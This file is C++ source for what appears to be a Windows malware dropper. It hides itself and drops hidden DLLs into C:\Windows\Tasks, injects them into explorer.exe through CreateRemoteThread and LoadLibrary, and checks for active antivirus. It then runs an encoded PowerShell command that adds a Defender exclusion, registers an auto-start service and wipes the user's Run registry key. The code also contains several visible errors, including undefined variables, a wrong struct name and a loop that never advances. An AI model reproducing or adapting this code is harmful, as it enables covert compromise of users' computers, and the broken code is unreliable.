#include <iostream>
#include <windows.h>
#include <wscapi.h>
#include <sys/stat.h>
#include <tlhelp32.h>
#include <fstream>
using namespace std;




bool chkadmin()
{
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}

string usr()
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL,buffer,MAX_PATH);
    return string(buffer);
}

int getpid(const char *nam)
{
    HANDLE fuck;
    PROCESS32ENTRY pe;
    bool res;
    int pi;
    fuck = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    res = Process32First(fuck,&pe);
    while(fuck)
    {
        if(strcmp(nam,pe.szExeFile)== 0)
        {
            pi = pe.dwProcessId;
            break;
        }
    }
    return pi;
}

int main(int agrc,char *argv[])
{
    FreeConsole();
    const char *hsv = "C:\\Windows\\Tasks\\hsv.exe";
    const char *dll = "C:\\Windows\\Tasks\\Web.dll";
    const char *LatencyGene = "C:\\Windows\\Tasks\\LAT";
    const char *adll = "C:\\Windows\\Tasks\\elv.dll";
    const char *active = "C:\\Windows\\SysWOW64\\HSVA.exe";
    struct stat sb,sj,jk;
    if(stat(active,&jk)== 0)
    {
        return 0;
    }
    if(chkadmin() == false)
    {
        if(stat(hsv,&sb)=! 0)
        {
            string us = usr();
            CopyFileA(us.c_str(),hsv,0);
            SetFileAttributesA(hsv,FILE_ATTRIBUTE_HIDDEN);
            HRSRC find = FindResource(NULL,"pDLL",RT_RCDATA);
            HGLOBAL glo = LoadResource(NULL,find);
            DWORD siz = SizeofResource(NULL,find);
            void *dat = LockResource(glo);
            DWORD wri;
            HANDLE cre = CreateFileA(dll,GENERIC_WRITE,0,NULL,CREATE_NEW,FILE_ATTRIBUTE_HIDDEN,0);
            WriteFile(cre,dat,siz,&wri,0);
            CloseHandle(cre);
            pid = getpid("explorer.exe");
            HANDLE op = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
            LPVOID exec = VirtualAllocEx(op,NULL,strlen(dll)+1,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(op,exec,strlen(dll)+1,dll,0);
            CreateRemoteThread(op,0,0,(LPTHREAD_START_ROUTINE)LoadLibraryA,exec,0,0);
            ofstream op(LatencyGene);
            op<<"";
            op.close();
            return 0;
        }
        if(stat(dll,&sj)== 0)
        {
            DeleteFileA(dll);
        }
        while(1)
        {
            HRESULT hr = CoInitialize(NULL);
            IWscProductList* List = nullptr;
            hr = CoCreateInstance(__uuidof(WscProductList),NULL,CLSCTX_INPROC_SERVER,__uuidof(IWscProductList),(LPVOID*)&List);
            hr = List->Initialize(WSC_SECURITY_PROVIDER_ANTIVIRUS);
            LONG c = 0;
            LONG i;
            List->get_Count(&c);
            bool cs = true;
            for(i=0;i<c;i++)
            {
                IWscProduct* Pro = nullptr;
                List->get_Item(i,&Pro);
                WSC_SECURITY_PRODUCT_STATE state;
                Pro->get_ProductState(&state);
                if(state == WSC_SECURITY_PRODUCT_STATE_ON)
                {
                    cs = false;
                    i = c +1;
                }
            }
            if(cs == true)
            {
                DeleteFileA(LatencyGene);
            }
            struct stat chklat;
            if(stat(LAT,&chklat)!= 0)
            {
                HRSRC find = FindResource(NULL,"ADLL",RT_RCDATA);
                HGLOBAL glo = LoadResource(NULL,find);
                DWORD siz = SizeofResource(NULL,find);
                void *dat = LockResource(glo);
                HANDLE cre = CreateFileA(adll,GENERIC_WRITE,0,NULL,CREATE_NEW,FILE_ATTRIBUTE_HIDDEN,0);
                WriteFile(cre,dat,siz,&wri,0);
                int pid = getpid("explorer.exe");
                HANDLE op = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
                LPVOID exec = VirtualAllocEx(op,NULL,strlen(dll)+1,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(op,exec,dll,strlen(dll)+1,0);
                CreateRemoteThread(op,0,0,(LPTHREAD_START_ROUTINE)LoadLibraryA,exec,0,0);
                break;
            }

        }
    return 0;
    }
    ShellExecuteA(NULL,"runas","cmd.exe","powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwBXAE8AVwA2ADQA",NULL,SW_HIDE);
    HRSRC find = FindResource(NULL,"ACTIVE",RT_RCDATA);
    HGLOBAL glo = LoadResource(NULL,find);
    DWORD siz = SizeofResource(NULL,find);
    void *dat = LockResource(glo);
    HANDLE cre = CreateFileA(active,GENERIC_WRITE,0,NULL,CREATE_NEW,FILE_ATTRIBUTE_HIDDEN,0);
    WriteFile(cre,dat,siz,&wri,0);
    CloseHandle(cre);
    SC_HANDLE cs = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE fuck = CreateServiceA(cs,"HSV","HSV",SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,NULL,NULL,NULL,NULL,NULL);
    Sleep(2000);
    ShellExecuteA(NULL,"runas","cmd.exe","/c sc start HSV",NULL,SW_HIDE);
    RegDeleteTreeW(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    return 0;
}